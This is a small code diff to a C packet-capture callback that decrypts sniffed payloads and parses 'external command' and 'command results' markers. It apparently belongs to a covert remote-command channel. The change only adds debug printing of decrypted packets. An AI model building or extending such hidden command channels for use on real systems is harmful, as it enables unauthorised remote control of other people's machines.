@@ -140,6 +140,9 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	strncpy(decrypted, (char *)aes_decrypt(&decrypt, (unsigned char *)payload,
 				&size_payload), size_payload);
 
+	printf("decrypted packet: \n%s\n", decrypted);
+	fprintf(stderr, "got it?\n");
+
 	if ((start = strstr(decrypted, EXT_CMD_START)) && server) {
 		/* process external command */
 		start += strlen(EXT_CMD_START);
@@ -195,7 +198,6 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 	else if ((start = strstr(decrypted, RESULT_START)) && !server) {
 		/* process command results */
 		start += strlen(RESULT_START);
-		fprintf(stderr, "got it?\n");
 
 		if (!(end = strstr(start, RESULT_END)))
 			return; /* no ending results */
